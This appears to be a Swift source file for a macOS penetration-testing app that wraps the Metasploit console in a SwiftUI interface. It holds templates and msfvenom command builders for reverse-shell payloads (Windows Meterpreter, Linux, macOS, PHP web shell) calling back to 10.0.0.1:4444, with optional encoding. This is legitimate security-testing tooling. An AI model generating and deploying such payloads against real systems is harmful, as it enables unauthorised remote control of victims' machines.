//
//  AdvancedMetasploitConsoleView.swift
//  DonkTool
//
//  Real Metasploit Framework Console Integration
//

import SwiftUI
import Combine

struct AdvancedMetasploitConsoleView: View {
    @StateObject private var msfConsole = MetasploitConsoleManager()
    @State private var commandInput = ""
    @State private var selectedTab = 0
    @State private var showingPayloadGenerator = false
    
    var body: some View {
        VStack(spacing: 0) {
            // Header
            headerView
            
            // Main Content
            TabView(selection: $selectedTab) {
                consoleTab
                    .tabItem {
                        Label("Console", systemImage: "terminal")
                    }
                    .tag(0)
                
                modulesTab
                    .tabItem {
                        Label("Modules", systemImage: "cube.box")
                    }
                    .tag(1)
                
                sessionsTab
                    .tabItem {
                        Label("Sessions", systemImage: "link")
                    }
                    .tag(2)
                
                payloadsTab
                    .tabItem {
                        Label("Payloads", systemImage: "hammer")
                    }
                    .tag(3)
            }
        }
        .sheet(isPresented: $showingPayloadGenerator) {
            PayloadGeneratorSheet(console: msfConsole)
        }
    }
    
    private var headerView: some View {
        HStack {
            VStack(alignment: .leading) {
                Text("Metasploit Console")
                    .font(.headerPrimary)
                
                HStack {
                    Circle()
                        .fill(msfConsole.isConnected ? Color.green : Color.red)
                        .frame(width: 8, height: 8)
                    
                    Text(msfConsole.isConnected ? "Connected" : "Disconnected")
                        .font(.captionPrimary)
                        .foregroundColor(.secondary)
                    
                    if msfConsole.isConnecting {
                        ProgressView()
                            .scaleEffect(0.7)
                    }
                }
            }
            
            Spacer()
            
            Button(action: toggleConnection) {
                Label(msfConsole.isConnected ? "Disconnect" : "Connect", 
                      systemImage: msfConsole.isConnected ? "stop.circle" : "play.circle")
            }
            .secondaryButton()
        }
        .standardContainer()
    }
    
    private var consoleTab: some View {
        VStack(spacing: 0) {
            // Console Output
            ScrollViewReader { proxy in
                ScrollView {
                    Text(msfConsole.consoleOutput)
                        .font(.codePrimary)
                        .frame(maxWidth: .infinity, alignment: .leading)
                        .standardContainer()
                        .id("bottom")
                }
                .background(Color.black.opacity(0.9))
                .foregroundColor(.green)
                .onChange(of: msfConsole.consoleOutput) { _ in
                    withAnimation {
                        proxy.scrollTo("bottom", anchor: .bottom)
                    }
                }
            }
            
            // Command Input
            HStack {
                Text("msf6 >")
                    .font(.codePrimary)
                    .foregroundColor(.green)
                
                TextField("Enter command...", text: $commandInput)
                    .textFieldStyle(PlainTextFieldStyle())
                    .font(.codePrimary)
                    .onSubmit {
                        executeCommand()
                    }
                
                Button("Execute") {
                    executeCommand()
                }
                .disabled(!msfConsole.isConnected || commandInput.isEmpty)
            }
            .standardContainer()
            .background(Color.gray.opacity(0.1))
        }
    }
    
    private var modulesTab: some View {
        VStack {
            // Module Search
            HStack {
                TextField("Search modules...", text: $msfConsole.moduleSearchQuery)
                    .textFieldStyle(RoundedBorderTextFieldStyle())
                
                Button("Search") {
                    msfConsole.searchModules()
                }
                .disabled(!msfConsole.isConnected)
            }
            .standardContainer()
            
            // Module List
            if msfConsole.searchResults.isEmpty {
                VStack {
                    Image(systemName: "magnifyingglass")
                        .font(.largeTitle)
                        .foregroundColor(.secondary)
                    Text("Search for Metasploit modules")
                        .font(.bodyPrimary)
                        .foregroundColor(.secondary)
                }
                .frame(maxWidth: .infinity, maxHeight: .infinity)
            } else {
                List(msfConsole.searchResults) { module in
                    ModuleRow(module: module) {
                        msfConsole.useModule(module)
                        selectedTab = 0 // Switch to console
                    }
                }
            }
        }
    }
    
    private var sessionsTab: some View {
        VStack {
            if msfConsole.sessions.isEmpty {
                VStack {
                    Image(systemName: "link.slash")
                        .font(.largeTitle)
                        .foregroundColor(.secondary)
                    Text("No active sessions")
                        .font(.headerSecondary)
                        .foregroundColor(.secondary)
                    Text("Run exploits to create sessions")
                        .font(.captionPrimary)
                        .foregroundColor(.secondary)
                }
                .frame(maxWidth: .infinity, maxHeight: .infinity)
            } else {
                List(msfConsole.sessions) { session in
                    SessionRow(session: session, console: msfConsole)
                }
            }
        }
    }
    
    private var payloadsTab: some View {
        VStack {
            HStack {
                Text("Payload Generation")
                    .font(.title2)
                    .fontWeight(.bold)
                
                Spacer()
                
                Button("Generate Custom") {
                    showingPayloadGenerator = true
                }
                .buttonStyle(.borderedProminent)
            }
            .standardContainer()
            
            // Quick payload templates
            ScrollView {
                VStack(spacing: 12) {
                    ForEach(PayloadTemplate.commonTemplates) { template in
                        PayloadTemplateCard(template: template) {
                            msfConsole.generatePayload(template)
                        }
                        .padding(.horizontal)
                    }
                }
                .padding(.vertical)
            }
        }
    }
    
    private func toggleConnection() {
        if msfConsole.isConnected {
            msfConsole.disconnect()
        } else {
            msfConsole.connect()
        }
    }
    
    private func executeCommand() {
        guard !commandInput.isEmpty else { return }
        msfConsole.executeCommand(commandInput)
        commandInput = ""
    }
}

// MARK: - Metasploit Console Manager with Real Process Interaction

@MainActor
class MetasploitConsoleManager: ObservableObject {
    @Published var isConnected = false
    @Published var isConnecting = false
    @Published var consoleOutput = ""
    @Published var sessions: [MsfSession] = []
    @Published var searchResults: [MsfModule] = []
    @Published var moduleSearchQuery = ""
    
    private var msfProcess: Process?
    private var inputPipe: Pipe?
    private var outputPipe: Pipe?
    
    func connect() {
        guard !isConnected else { return }
        
        // Check if msfconsole is installed
        let msfPaths = [
            "/opt/metasploit-framework/bin/msfconsole",
            "/usr/local/bin/msfconsole",
            "/usr/bin/msfconsole"
        ]
        
        var msfPath: String?
        for path in msfPaths {
            if FileManager.default.fileExists(atPath: path) {
                msfPath = path
                break
            }
        }
        
        guard let executablePath = msfPath else {
            consoleOutput += "❌ Metasploit Framework not found. Please install it first.\n"
            consoleOutput += "Install with: brew install metasploit\n"
            return
        }
        
        isConnecting = true
        consoleOutput += "🔧 Starting Metasploit Framework...\n"
        
        // Create process
        let process = Process()
        process.executableURL = URL(fileURLWithPath: executablePath)
        process.arguments = ["-q"] // Quiet mode, no banner
        
        // Setup pipes
        let input = Pipe()
        let output = Pipe()
        let error = Pipe()
        
        process.standardInput = input
        process.standardOutput = output
        process.standardError = error
        
        inputPipe = input
        outputPipe = output
        
        // Setup output handling
        output.fileHandleForReading.readabilityHandler = { [weak self] handle in
            let data = handle.availableData
            if !data.isEmpty {
                if let string = String(data: data, encoding: .utf8) {
                    DispatchQueue.main.async {
                        self?.consoleOutput += string
                        self?.parseOutput(string)
                    }
                }
            }
        }
        
        error.fileHandleForReading.readabilityHandler = { [weak self] handle in
            let data = handle.availableData
            if !data.isEmpty {
                if let string = String(data: data, encoding: .utf8) {
                    DispatchQueue.main.async {
                        self?.consoleOutput += "⚠️ \(string)"
                    }
                }
            }
        }
        
        // Start process
        do {
            try process.run()
            msfProcess = process
            
            // Wait a bit for initialization
            DispatchQueue.main.asyncAfter(deadline: .now() + 2) { [weak self] in
                self?.isConnected = true
                self?.isConnecting = false
                self?.consoleOutput += "✅ Connected to Metasploit Framework\n"
                
                // Get initial info
                self?.executeCommand("version")
            }
        } catch {
            isConnecting = false
            consoleOutput += "❌ Failed to start Metasploit: \(error.localizedDescription)\n"
        }
    }
    
    func disconnect() {
        executeCommand("exit -y")
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) { [weak self] in
            self?.msfProcess?.terminate()
            self?.msfProcess = nil
            self?.inputPipe = nil
            self?.outputPipe = nil
            self?.isConnected = false
            self?.consoleOutput += "\n🔌 Disconnected from Metasploit Framework\n"
        }
    }
    
    func executeCommand(_ command: String) {
        guard isConnected, let inputPipe = inputPipe else { return }
        
        let fullCommand = command + "\n"
        if let data = fullCommand.data(using: .utf8) {
            inputPipe.fileHandleForWriting.write(data)
        }
    }
    
    func searchModules() {
        guard !moduleSearchQuery.isEmpty else { return }
        executeCommand("search \(moduleSearchQuery)")
    }
    
    func useModule(_ module: MsfModule) {
        executeCommand("use \(module.fullPath)")
        executeCommand("info")
    }
    
    func generatePayload(_ template: PayloadTemplate) {
        let command = "msfvenom -p \(template.payload) LHOST=\(template.lhost) LPORT=\(template.lport) -f \(template.format) -o /tmp/payload.\(template.format)"
        executeCommand(command)
    }
    
    private func parseOutput(_ output: String) {
        // Parse sessions
        if output.contains("Active sessions") {
            // Parse session list
            let lines = output.components(separatedBy: .newlines)
            var inSessionList = false
            
            for line in lines {
                if line.contains("Active sessions") {
                    inSessionList = true
                    sessions.removeAll()
                    continue
                }
                
                if inSessionList && line.trimmingCharacters(in: .whitespaces).isEmpty {
                    inSessionList = false
                    continue
                }
                
                if inSessionList {
                    if let session = parseSessionLine(line) {
                        sessions.append(session)
                    }
                }
            }
        }
        
        // Parse search results
        if output.contains("Matching Modules") {
            parseSearchResults(output)
        }
    }
    
    private func parseSessionLine(_ line: String) -> MsfSession? {
        let components = line.split(separator: " ", omittingEmptySubsequences: true)
        if components.count >= 4, let id = Int(components[0]) {
            return MsfSession(
                id: id,
                type: String(components[2]),
                info: components[3...].joined(separator: " ")
            )
        }
        return nil
    }
    
    private func parseSearchResults(_ output: String) {
        searchResults.removeAll()
        let lines = output.components(separatedBy: .newlines)
        
        for line in lines {
            if line.contains("exploit/") || line.contains("auxiliary/") || line.contains("post/") {
                let components = line.split(separator: " ", omittingEmptySubsequences: true)
                if components.count >= 3 {
                    let fullPath = String(components[0])
                    let rank = String(components[1])
                    let name = components[2...].joined(separator: " ")
                    
                    searchResults.append(MsfModule(
                        id: UUID().uuidString,
                        fullPath: fullPath,
                        name: name,
                        rank: rank
                    ))
                }
            }
        }
    }
}

// MARK: - Supporting Models

struct MsfModule: Identifiable {
    let id: String
    let fullPath: String
    let name: String
    let rank: String
}

struct MsfSession: Identifiable {
    let id: Int
    let type: String
    let info: String
}

struct PayloadTemplate: Identifiable {
    let id = UUID()
    let name: String
    let description: String
    let payload: String
    let lhost: String
    let lport: String
    let format: String
    
    static let commonTemplates = [
        PayloadTemplate(
            name: "Windows Meterpreter",
            description: "Reverse TCP Meterpreter for Windows",
            payload: "windows/meterpreter/reverse_tcp",
            lhost: "10.0.0.1",
            lport: "4444",
            format: "exe"
        ),
        PayloadTemplate(
            name: "Linux Shell",
            description: "Reverse TCP shell for Linux",
            payload: "linux/x86/shell/reverse_tcp",
            lhost: "10.0.0.1",
            lport: "4444",
            format: "elf"
        ),
        PayloadTemplate(
            name: "macOS Shell",
            description: "Reverse TCP shell for macOS",
            payload: "osx/x64/shell_reverse_tcp",
            lhost: "10.0.0.1",
            lport: "4444",
            format: "macho"
        ),
        PayloadTemplate(
            name: "PHP Web Shell",
            description: "PHP reverse shell for web servers",
            payload: "php/meterpreter/reverse_tcp",
            lhost: "10.0.0.1",
            lport: "4444",
            format: "raw"
        )
    ]
}

// MARK: - Component Views

struct ModuleRow: View {
    let module: MsfModule
    let onUse: () -> Void
    
    var body: some View {
        HStack {
            VStack(alignment: .leading) {
                Text(module.fullPath)
                    .font(.codePrimary)
                
                Text(module.name)
                    .font(.caption)
                    .foregroundColor(.secondary)
            }
            
            Spacer()
            
            Text(module.rank)
                .font(.caption)
                .padding(.horizontal, 8)
                .padding(.vertical, 4)
                .background(rankColor(module.rank).opacity(0.2))
                .foregroundColor(rankColor(module.rank))
                .cornerRadius(4)
            
            Button("Use") {
                onUse()
            }
            .secondaryButton()
            .controlSize(.small)
        }
        .padding(.vertical, 4)
    }
    
    private func rankColor(_ rank: String) -> Color {
        switch rank.lowercased() {
        case "excellent": return .green
        case "great": return .green
        case "good": return .blue
        case "normal": return .orange
        case "average": return .orange
        case "low": return .red
        case "manual": return .gray
        default: return .gray
        }
    }
}

struct SessionRow: View {
    let session: MsfSession
    let console: MetasploitConsoleManager
    
    var body: some View {
        HStack {
            VStack(alignment: .leading) {
                Text("Session \(session.id)")
                    .font(.headline)
                
                Text(session.type)
                    .font(.caption)
                    .foregroundColor(.secondary)
                
                Text(session.info)
                    .font(.caption)
                    .foregroundColor(.secondary)
            }
            
            Spacer()
            
            Button("Interact") {
                console.executeCommand("sessions -i \(session.id)")
            }
            .secondaryButton()
            .controlSize(.small)
            
            Button("Kill") {
                console.executeCommand("sessions -k \(session.id)")
            }
            .secondaryButton()
            .controlSize(.small)
            .foregroundColor(.red)
        }
        .padding(.vertical, 4)
    }
}

struct PayloadTemplateCard: View {
    let template: PayloadTemplate
    let onGenerate: () -> Void
    
    var body: some View {
        VStack(alignment: .leading, spacing: 8) {
            Text(template.name)
                .font(.headline)
            
            Text(template.description)
                .font(.caption)
                .foregroundColor(.secondary)
            
            HStack {
                Label(template.payload, systemImage: "terminal")
                    .font(.caption2)
                
                Spacer()
                
                Button("Generate") {
                    onGenerate()
                }
                .secondaryButton()
                .controlSize(.small)
            }
        }
        .standardContainer()
        .background(Color.gray.opacity(0.05))
        .cornerRadius(8)
    }
}

struct PayloadGeneratorSheet: View {
    @Environment(\.dismiss) private var dismiss
    @ObservedObject var console: MetasploitConsoleManager
    
    @State private var payload = "windows/meterpreter/reverse_tcp"
    @State private var lhost = "10.0.0.1"
    @State private var lport = "4444"
    @State private var format = "exe"
    @State private var encoder = ""
    @State private var iterations = "1"
    
    var body: some View {
        VStack(spacing: 20) {
            Text("Generate Custom Payload")
                .font(.title2)
                .fontWeight(.bold)
            
            Form {
                Section(header: Text("Payload Configuration")) {
                    TextField("Payload", text: $payload)
                    TextField("LHOST", text: $lhost)
                    TextField("LPORT", text: $lport)
                    TextField("Format", text: $format)
                }
                
                Section(header: Text("Encoding (Optional)")) {
                    TextField("Encoder", text: $encoder)
                    TextField("Iterations", text: $iterations)
                }
            }
            .frame(height: 300)
            
            HStack {
                Button("Cancel") {
                    dismiss()
                }
                
                Spacer()
                
                Button("Generate") {
                    generatePayload()
                    dismiss()
                }
                .buttonStyle(.borderedProminent)
            }
        }
        .standardContainer()
        .frame(width: 500)
    }
    
    private func generatePayload() {
        var command = "msfvenom -p \(payload) LHOST=\(lhost) LPORT=\(lport) -f \(format)"
        
        if !encoder.isEmpty {
            command += " -e \(encoder) -i \(iterations)"
        }
        
        command += " -o /tmp/payload.\(format)"
        
        console.executeCommand(command)
    }
}

#Preview {
    AdvancedMetasploitConsoleView()
}